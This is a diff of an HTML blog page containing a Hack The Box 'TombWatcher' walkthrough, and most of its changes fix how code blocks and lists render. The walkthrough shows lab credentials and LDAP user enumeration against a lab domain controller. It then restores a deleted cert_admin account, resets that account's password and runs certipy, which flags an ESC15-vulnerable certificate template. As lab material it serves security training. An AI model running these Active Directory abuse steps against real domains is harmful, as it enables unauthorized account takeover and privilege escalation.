@@ -473,8 +473,8 @@
 <meta name="generator" content="Jekyll v3.10.0" />
 <meta property="og:title" content="TombWatcher (HTB) - Walkthrough" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="Overview" />
-<meta property="og:description" content="Overview" />
+<meta name="description" content="Overview Abuse AD misconfiguration and  ESC15 Vulnerability" />
+<meta property="og:description" content="Overview Abuse AD misconfiguration and  ESC15 Vulnerability" />
 <link rel="canonical" href="https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/" />
 <meta property="og:url" content="https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/" />
 <meta property="og:site_name" content="Kaulik Makwana" />
@@ -483,7 +483,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="TombWatcher (HTB) - Walkthrough" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-25T00:00:00+00:00","datePublished":"2025-07-25T00:00:00+00:00","description":"Overview","headline":"TombWatcher (HTB) - Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-25T00:00:00+00:00","datePublished":"2025-07-25T00:00:00+00:00","description":"Overview Abuse AD misconfiguration and  ESC15 Vulnerability","headline":"TombWatcher (HTB) - Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/TombWatcher-Hackthebox-Walkthrough/"}</script>
 <!-- End Jekyll SEO tag -->
 
 <style>
@@ -573,14 +573,19 @@
                     }
                 </style>
                 <h1 id="section-overview">Overview</h1>
-
 <p>Abuse AD misconfiguration and  ESC15 Vulnerability</p>
 
 <hr />
+
 <h2 id="section-initial-credentials">initial credentials</h2>
-<p>-&gt;  we have been provided initial credentials 
-	- user : henry 
-	- pass : H3nry_987TGV!</p>
+<ul>
+  <li>we have been provided initial credentials
+    <ul>
+      <li>user : henry</li>
+      <li>pass : H3nry_987TGV!</li>
+    </ul>
+  </li>
+</ul>
 
 <hr />
 
@@ -693,13 +698,14 @@
 </code></pre></div></div>
 
 <ul>
-  <li>
-    <h2 id="section-on-port-80-nothing-usefull-so-moved-to-ad">on port 80 nothing usefull so moved to AD</h2>
-  </li>
+  <li>on port 80 nothing usefull so moved to AD</li>
 </ul>
+
+<hr />
 
 <h2 id="section--ad-enumeration">🌐 AD enumeration</h2>
 <h3 id="section--user-enumeration">👥 user enumeration</h3>
+
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nxc ldap <span class="nv">$ip</span> <span class="nt">-u</span> <span class="nv">$user1</span> <span class="nt">-p</span> <span class="nv">$pass1</span> <span class="nt">--users</span> <span class="nt">--users-export</span> AD_users 
 	Administrator
 	Guest
@@ -736,6 +742,7 @@ INFO: Found 0 trusts
 INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: DC01.tombwatcher.htb
 INFO: Done <span class="k">in </span>01M 46S
+
 </code></pre></div></div>
 
 <div align="center">
@@ -791,9 +798,10 @@ LDAP        10.10.11.72     389    DC01             <span class="o">[</span>+] t
 
 <p>again  coming back to bloodhound and enumerating user alfred ; found that user  has the ability to add itself, to the group INFRASTRUCTURE and then gain the same privileges that INFRASTRUCTURE has.</p>
 
-<p><img src="/assets/images/writeups/hackthebox/TombWatcher/Screenshot From 2025-09-04 12-53-39.png" alt="Root page source code leak" width="1000" height="900" class="writeup-img" /></p>
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/TombWatcher/Screenshot From 2025-09-04 12-53-39.png" alt="Root page source code leak" width="1000" height="900" class="writeup-img" /></p>
 
-<p>&lt;/div&gt;</p>
+</div>
 
 <div align="center">
 
@@ -943,21 +951,21 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 <ul>
   <li>so we can do privilege escalation or abuse of certificate enrollment.</li>
-  <li>so privious we see that something was deleted so we should check recyclebin
-```shell</li>
+  <li>so privious we see that something was deleted so we should check recyclebin .</li>
 </ul>
 
-<p>$ Get-ADObject -Filter ‘IsDeleted -eq $true’ -IncludeDeletedObjects -Properties *</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">$ </span>Get-ADObject <span class="nt">-Filter</span> <span class="s1">'IsDeleted -eq $true'</span> <span class="nt">-IncludeDeletedObjects</span> <span class="nt">-Properties</span> <span class="k">*</span>
 
-<p>CanonicalName                   : tombwatcher.htb/Deleted Objects
+CanonicalName                   : tombwatcher.htb/Deleted Objects
 CN                              : Deleted Objects
 Created                         : 11/15/2024 7:01:41 PM
 createTimeStamp                 : 11/15/2024 7:01:41 PM
 Deleted                         : True
-Description                     : Default container for deleted objects
+Description                     : Default container <span class="k">for </span>deleted objects
 DisplayName                     :
-DistinguishedName               : CN=Deleted Objects,DC=tombwatcher,DC=htb
-dSCorePropagationData           : {12/31/1600 7:00:00 PM}
+DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>Deleted Objects,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+dSCorePropagationData           : <span class="o">{</span>12/31/1600 7:00:00 PM<span class="o">}</span>
 instanceType                    : 4
 isCriticalSystemObject          : True
 isDeleted                       : True
@@ -965,19 +973,19 @@ LastKnownParent                 :
 Modified                        : 11/15/2024 7:56:00 PM
 modifyTimeStamp                 : 11/15/2024 7:56:00 PM
 Name                            : Deleted Objects
-ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
+ObjectCategory                  : <span class="nv">CN</span><span class="o">=</span>Container,CN<span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
 ObjectClass                     : container
 ObjectGUID                      : 34509cb3-2b23-417b-8b98-13f0bd953319
 ProtectedFromAccidentalDeletion :
 sDRightsEffective               : 0
 showInAdvancedViewOnly          : True
-systemFlags                     : -1946157056
+systemFlags                     : <span class="nt">-1946157056</span>
 uSNChanged                      : 12851
 uSNCreated                      : 5659
 whenChanged                     : 11/15/2024 7:56:00 PM
-whenCreated                     : 11/15/2024 7:01:41 PM</p>
+whenCreated                     : 11/15/2024 7:01:41 PM
 
-<p>accountExpires                  : 9223372036854775807
+accountExpires                  : 9223372036854775807
 badPasswordTime                 : 0
 badPwdCount                     : 0
 CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
@@ -991,12 +999,12 @@ createTimeStamp                 : 11/15/2024 7:55:59 PM
 Deleted                         : True
 Description                     :
 DisplayName                     :
-DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
-dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
+DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>cert_admin<span class="se">\0</span>ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+dSCorePropagationData           : <span class="o">{</span>11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM<span class="o">}</span>
 givenName                       : cert_admin
 instanceType                    : 4
 isDeleted                       : True
-LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
+LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
 lastLogoff                      : 0
 lastLogon                       : 0
 logonCount                      : 0
@@ -1020,9 +1028,9 @@ userAccountControl              : 66048
 uSNChanged                      : 12975
 uSNCreated                      : 12844
 whenChanged                     : 11/15/2024 7:57:59 PM
-whenCreated                     : 11/15/2024 7:55:59 PM</p>
+whenCreated                     : 11/15/2024 7:55:59 PM
 
-<p>accountExpires                  : 9223372036854775807
+accountExpires                  : 9223372036854775807
 badPasswordTime                 : 0
 badPwdCount                     : 0
 CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
@@ -1036,12 +1044,12 @@ createTimeStamp                 : 11/16/2024 12:04:05 PM
 Deleted                         : True
 Description                     :
 DisplayName                     :
-DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
-dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
+DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>cert_admin<span class="se">\0</span>ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+dSCorePropagationData           : <span class="o">{</span>11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM<span class="o">}</span>
 givenName                       : cert_admin
 instanceType                    : 4
 isDeleted                       : True
-LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
+LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
 lastLogoff                      : 0
 lastLogon                       : 0
 logonCount                      : 0
@@ -1065,9 +1073,9 @@ userAccountControl              : 66048
 uSNChanged                      : 13171
 uSNCreated                      : 13161
 whenChanged                     : 11/16/2024 12:04:21 PM
-whenCreated                     : 11/16/2024 12:04:05 PM</p>
+whenCreated                     : 11/16/2024 12:04:05 PM
 
-<p>accountExpires                  : 9223372036854775807
+accountExpires                  : 9223372036854775807
 badPasswordTime                 : 0
 badPwdCount                     : 0
 CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
@@ -1081,12 +1089,12 @@ createTimeStamp                 : 11/16/2024 12:07:04 PM
 Deleted                         : True
 Description                     :
 DisplayName                     :
-DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
-dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
+DistinguishedName               : <span class="nv">CN</span><span class="o">=</span>cert_admin<span class="se">\0</span>ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+dSCorePropagationData           : <span class="o">{</span>11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM<span class="o">}</span>
 givenName                       : cert_admin
 instanceType                    : 4
 isDeleted                       : True
-LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
+LastKnownParent                 : <span class="nv">OU</span><span class="o">=</span>ADCS,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
 lastLogoff                      : 0
 lastLogon                       : 0
 logonCount                      : 0
@@ -1110,32 +1118,36 @@ userAccountControl              : 66048
 uSNChanged                      : 13197
 uSNCreated                      : 13186
 whenChanged                     : 11/16/2024 12:07:27 PM
-whenCreated                     : 11/16/2024 12:07:04 PM</p>
+whenCreated                     : 11/16/2024 12:07:04 PM
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-- so deleted object was cert_admin so we can try to restore again and reset user password 
+</code></pre></div></div>
 
-	```shell
-	# restore object
-	$ Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb" 
+<ul>
+  <li>
+    <p>so deleted object was cert_admin so we can try to restore again and reset user password</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="c"># restore object</span>
+  <span class="nv">$ </span>Restore-ADObject <span class="nt">-Identity</span> <span class="s2">"CN=cert_admin</span><span class="se">\0</span><span class="s2">ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"</span> 
 	
-	# reset password
-	$ Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "Password@1234" -AsPlainText -Force)
+  <span class="c"># reset password</span>
+  <span class="nv">$ </span>Set-ADAccountPassword <span class="nt">-Identity</span> <span class="s2">"cert_admin"</span> <span class="nt">-Reset</span> <span class="nt">-NewPassword</span> <span class="o">(</span>ConvertTo-SecureString <span class="s2">"Password@1234"</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span><span class="o">)</span>
 	
-	```
+</code></pre></div>    </div>
+  </li>
+</ul>
 
----
-### Varifying certificate user cert_admin
+<hr />
 
-```shell
+<h3 id="section-varifying-certificate-user-cert_admin">Varifying certificate user cert_admin</h3>
 
-$ certipy-ad find -vulnerable -u cert_admin@tombwatcher.htb -p 'Password@1234' -dc-ip 10.10.11.72 -stdout
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">$ </span>certipy-ad find <span class="nt">-vulnerable</span> <span class="nt">-u</span> cert_admin@tombwatcher.htb <span class="nt">-p</span> <span class="s1">'Password@1234'</span> <span class="nt">-dc-ip</span> 10.10.11.72 <span class="nt">-stdout</span>
 
 	Certificate Authorities
 	  0
 	    CA Name                             : tombwatcher-CA-1
 	    DNS Name                            : DC01.tombwatcher.htb
-	    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
+	    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>tombwatcher-CA-1, <span class="nv">DC</span><span class="o">=</span>tombwatcher, <span class="nv">DC</span><span class="o">=</span>htb
 	    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
 	    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
 	    Certificate Validity End            : 2123-11-16 00:57:48+00:00
@@ -1146,18 +1158,18 @@ $ certipy-ad find -vulnerable -u cert_admin@tombwatcher.htb -p 'Password@1234' -
 	        Enabled                         : False
 	    User Specified SAN                  : Disabled
 	    Request Disposition                 : Issue
-	    Enforce Encryption for Requests     : Enabled
+	    Enforce Encryption <span class="k">for </span>Requests     : Enabled
 	    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
 	    Permissions
-	      Owner                             : TOMBWATCHER.HTB\Administrators
+	      Owner                             : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
 	      Access Rights
-	        ManageCa                        : TOMBWATCHER.HTB\Administrators
-	                                          TOMBWATCHER.HTB\Domain Admins
-	                                          TOMBWATCHER.HTB\Enterprise Admins
-	        ManageCertificates              : TOMBWATCHER.HTB\Administrators
-	                                          TOMBWATCHER.HTB\Domain Admins
-	                                          TOMBWATCHER.HTB\Enterprise Admins
-	        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
+	        ManageCa                        : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+	                                          TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+	                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	        ManageCertificates              : TOMBWATCHER.HTB<span class="se">\A</span>dministrators
+	                                          TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+	                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	        Enroll                          : TOMBWATCHER.HTB<span class="se">\A</span>uthenticated Users
 	Certificate Templates
 	  0
 	    Template Name                       : WebServer
@@ -1181,25 +1193,25 @@ $ certipy-ad find -vulnerable -u cert_admin@tombwatcher.htb -p 'Password@1234' -
 	    Template Last Modified              : 2024-11-16T17:07:26+00:00
 	    Permissions
 	      Enrollment Permissions
-	        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
-	                                          TOMBWATCHER.HTB\Enterprise Admins
-	                                          TOMBWATCHER.HTB\cert_admin
+	        Enrollment Rights               : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+	                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	                                          TOMBWATCHER.HTB<span class="se">\c</span>ert_admin
 	      Object Control Permissions
-	        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
-	        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
-	                                          TOMBWATCHER.HTB\Enterprise Admins
-	        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
-	                                          TOMBWATCHER.HTB\Enterprise Admins
-	        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
-	                                          TOMBWATCHER.HTB\Enterprise Admins
-	        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
-	                                          TOMBWATCHER.HTB\Enterprise Admins
-	                                          TOMBWATCHER.HTB\cert_admin
-	    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
-	    [!] Vulnerabilities
+	        Owner                           : TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	        Full Control Principals         : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+	                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	        Write Owner Principals          : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+	                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	        Write Dacl Principals           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+	                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	        Write Property Enroll           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+	                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+	                                          TOMBWATCHER.HTB<span class="se">\c</span>ert_admin
+	    <span class="o">[</span>+] User Enrollable Principals      : TOMBWATCHER.HTB<span class="se">\c</span>ert_admin
+	    <span class="o">[!]</span> Vulnerabilities
 	      ESC15                             : Enrollee supplies subject and schema version is 1.
-	    [*] Remarks
-	      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+	    <span class="o">[</span><span class="k">*</span><span class="o">]</span> Remarks
+	      ESC15                             : Only applicable <span class="k">if </span>the environment has not been patched. See CVE-2024-49019 or the wiki <span class="k">for </span>more details.
 </code></pre></div></div>
 
 <p>we can see vuln : ESC15 and WebServer template again but with vuln which was not in privious attempt</p>
